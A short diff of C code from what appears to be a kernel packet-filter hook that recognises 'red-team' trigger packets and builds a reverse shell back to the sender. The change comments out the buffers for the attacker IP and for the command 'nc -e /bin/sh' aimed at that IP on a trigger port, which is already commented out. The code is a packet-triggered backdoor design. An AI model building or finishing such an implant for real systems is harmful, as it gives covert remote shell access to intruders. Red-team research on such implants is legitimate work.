@@ -59,7 +59,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
     // now we know the packet is a red-team packet
     // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
-    char attacker_ip_str[16];
+    // char attacker_ip_str[16];
     //snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
         // (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
         // (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
@@ -67,7 +67,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
         // ntohl(ip_header->ip_src.s_addr) & 0xFF);
 
     // Construct the reverse shell command
-    char reverse_shell_cmd[100];
+    // char reverse_shell_cmd[100];
     //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
